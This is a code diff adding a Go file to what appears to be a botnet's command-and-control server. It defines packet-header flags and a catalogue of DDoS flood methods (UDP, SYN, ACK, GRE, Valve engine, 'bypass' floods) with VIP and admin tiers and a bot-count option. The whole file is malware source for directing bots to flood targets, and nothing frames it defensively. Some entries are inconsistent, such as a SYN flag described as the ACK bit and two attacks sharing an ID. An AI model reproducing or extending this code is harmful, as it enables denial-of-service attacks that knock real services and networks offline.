@@ -1,0 +1,227 @@
+package attacks
+
+var flagInfoLookup = map[string]FlagInfo{
+	"len": {
+		0,
+		"Size of packet data, default is 512 bytes",
+	},
+	"rand": {
+		1,
+		"Randomize packet data content, default is 1 (yes)",
+	},
+	"tos": {
+		2,
+		"TOS field value in IP header, default is 0",
+	},
+	"ident": {
+		3,
+		"ID field value in IP header, default is random",
+	},
+	"ttl": {
+		4,
+		"TTL field in IP header, default is 255",
+	},
+	"df": {
+		5,
+		"Set the Dont-Fragment bit in IP header, default is 0 (no)",
+	},
+	"sport": {
+		6,
+		"Source port, default is random",
+	},
+	"dport": {
+		7,
+		"Destination port, default is random",
+	},
+	"urg": {
+		11,
+		"Set the URG bit in IP header, default is 0 (no)",
+	},
+	"ack": {
+		12,
+		"Set the ACK bit in IP header, default is 0 (no) except for ACK flood",
+	},
+	"psh": {
+		13,
+		"Set the PSH bit in IP header, default is 0 (no)",
+	},
+	"rst": {
+		14,
+		"Set the RST bit in IP header, default is 0 (no)",
+	},
+	"syn": {
+		15,
+		"Set the ACK bit in IP header, default is 0 (no) except for SYN flood",
+	},
+	"fin": {
+		16,
+		"Set the FIN bit in IP header, default is 0 (no)",
+	},
+	"seqnum": {
+		17,
+		"Sequence number value in TCP header, default is random",
+	},
+	"acknum": {
+		18,
+		"Ack number value in TCP header, default is random",
+	},
+	"gcip": {
+		19,
+		"Set internal IP to destination ip, default is 0 (no)",
+	},
+	"source": {
+		25,
+		"Source IP address, 255.255.255.255 for random",
+	},
+	"minlen": {
+		26,
+		"min len",
+	},
+	"maxlen": {
+		27,
+		"max len",
+	},
+	"payload": {
+		28,
+		"custom payload",
+	},
+	"repeat": {
+		29,
+		"number of times to repeat",
+	},
+	"count": {
+		30,
+		"Number of bots to use for attack, -1 for all bots",
+	},
+}
+
+var attackInfoLookup = map[string]AttackInfo{
+	"udpplain": {
+		ID:          0,
+		Flags:       []uint8{0, 2, 3, 4, 5, 6, 7, 30},
+		Description: "UDP flood with less options. optimized for higher PPS",
+		Vip:         false,
+		Admin:       false,
+		Disabled:    "",
+	},
+	"vse": {
+		ID:          1,
+		Flags:       []uint8{2, 3, 4, 5, 6, 7, 30},
+		Description: "Valve source engine specific flood",
+		Vip:         false,
+		Admin:       false,
+		Disabled:    "",
+	},
+	"syn": {
+		ID:          3,
+		Flags:       []uint8{2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25, 30},
+		Description: "SYN flood",
+		Vip:         false,
+		Admin:       false,
+		Disabled:    "",
+	},
+	"ack": {
+		ID:          4,
+		Flags:       []uint8{0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25, 30},
+		Description: "ACK flood",
+		Vip:         false,
+		Admin:       false,
+		Disabled:    "",
+	},
+	"stomp": {
+		ID:          5,
+		Flags:       []uint8{0, 1, 2, 3, 4, 5, 7, 11, 12, 13, 14, 15, 16, 30},
+		Description: "TCP stomp flood",
+		Vip:         false,
+		Admin:       false,
+		Disabled:    "",
+	},
+	"greip": {
+		ID:          6,
+		Flags:       []uint8{0, 1, 2, 3, 4, 5, 6, 7, 19, 25, 30},
+		Description: "GRE IP flood",
+		Vip:         false,
+		Admin:       false,
+		Disabled:    "",
+	},
+	"greeth": {
+		ID:          7,
+		Flags:       []uint8{0, 1, 2, 3, 4, 5, 6, 7, 19, 25, 30},
+		Description: "GRE Ethernet flood",
+		Vip:         false,
+		Admin:       false,
+		Disabled:    "",
+	},
+	"udp": {
+		ID:          9,
+		Flags:       []uint8{2, 3, 4, 0, 1, 5, 6, 7, 25, 30},
+		Description: "UDP flood",
+		Vip:         false,
+		Admin:       false,
+		Disabled:    "",
+	},
+	"tcpbypass": {
+		ID:          10,
+		Flags:       []uint8{0, 7, 26, 30},
+		Description: "TCP bypass socket flood",
+		Vip:         false,
+		Admin:       false,
+		Disabled:    "",
+	},
+	"udpbypass": {
+		ID:          11,
+		Flags:       []uint8{6, 7, 30},
+		Description: "UDP flood with less options. optimized for bypassing hosts",
+		Vip:         false,
+		Admin:       false,
+		Disabled:    "",
+	},
+	"std": {
+		ID:          12,
+		Flags:       []uint8{0, 1, 6, 7, 30},
+		Description: "STD socket flood",
+		Vip:         false,
+		Admin:       false,
+		Disabled:    "",
+	},
+	"pudp": {
+		ID:          12,
+		Flags:       []uint8{6, 7, 30},
+		Description: "better udp flood flood",
+		Vip:         false,
+		Admin:       false,
+		Disabled:    "",
+	},
+	"tcplegit": {
+		ID:          13,
+		Flags:       []uint8{0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25, 27, 30},
+		Description: "legit tcp flood",
+		Vip:         false,
+		Admin:       false,
+		Disabled:    "",
+	},
+	"socket": {
+		ID:          14,
+		Flags:       []uint8{0, 6, 7, 30},
+		Description: "Silliest socket flood",
+		Vip:         false,
+		Admin:       false,
+		Disabled:    "",
+	},
+	"esp": {
+		ID:          16,
+		Flags:       []uint8{0, 7, 30},
+		Description: "ESP flood",
+		Vip:         false,
+		Admin:       false,
+		Disabled:    "",
+	},
+	"udphex": {
+		ID:          17,
+		Flags:       []uint8{0, 6, 7, 30},
+		Description: "UDP Hex flood",
+		Vip:         false,
+		Admin:       false,
+		Disabled:    "",
+	},
+}
